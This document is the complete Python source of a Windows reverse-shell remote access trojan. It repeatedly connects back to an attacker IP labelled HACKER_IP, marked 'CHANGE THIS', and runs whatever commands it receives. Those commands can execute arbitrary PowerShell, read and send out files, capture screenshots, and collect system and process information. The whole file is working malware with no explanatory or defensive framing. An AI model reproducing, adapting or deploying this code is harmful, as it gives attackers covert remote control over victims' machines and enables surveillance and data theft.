import socket
import os
import subprocess
import pyautogui
import shutil
import time
import struct
from datetime import datetime

def execute_powershell(cmd):
    try:
        result = subprocess.run(
            ["powershell.exe", "-Command", cmd],
            capture_output=True,
            text=True,
            shell=True
        )
        return result.stdout or result.stderr
    except Exception as e:
        return f"PowerShell Error: {str(e)}"

def execute_command(cmd):
    try:
        # --- Basic Shell Commands ---
        if cmd.lower() in ["ls", "dir"]:
            return execute_powershell("Get-ChildItem")
            
        elif cmd.startswith("cd "):
            path = cmd[3:]
            os.chdir(path)
            return f"Current directory: {os.getcwd()}"
            
        elif cmd == "pwd":
            return os.getcwd()

        # --- PowerShell Commands ---
        elif cmd.startswith("ps "):
            return execute_powershell(cmd[3:])

        # --- File Operations ---
        elif cmd.startswith("download "):
            filepath = cmd[9:]
            if os.path.exists(filepath):
                with open(filepath, "rb") as f:
                    return f.read()
            return "FileNotFound"

        elif cmd == "screenshot":
            filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            pyautogui.screenshot(filename)
            with open(filename, "rb") as f:
                data = f.read()
            os.remove(filename)
            return data

        # --- System Commands ---
        elif cmd == "sysinfo":
            return execute_powershell("Get-ComputerInfo | Select-Object *")

        elif cmd == "processes":
            return execute_powershell("Get-Process | Format-Table Name,CPU,Id")

        else:
            return "UnknownCommand"

    except Exception as e:
        return f"Error: {str(e)}"

def main():
    HACKER_IP = "172.19.131.138"  # CHANGE THIS
    HACKER_PORT = 3306

    while True:
        try:
            with socket.socket() as s:
                s.connect((HACKER_IP, HACKER_PORT))
                while True:
                    cmd = s.recv(4096).decode().strip()
                    if not cmd:
                        continue

                    if cmd == "exit":
                        break

                    response = execute_command(cmd)
                    if isinstance(response, str):
                        s.send(response.encode())
                    else:  # Binary data
                        s.send(struct.pack("!I", len(response)) + response)

        except Exception:
            time.sleep(10)
            continue

if __name__ == "__main__":
    main()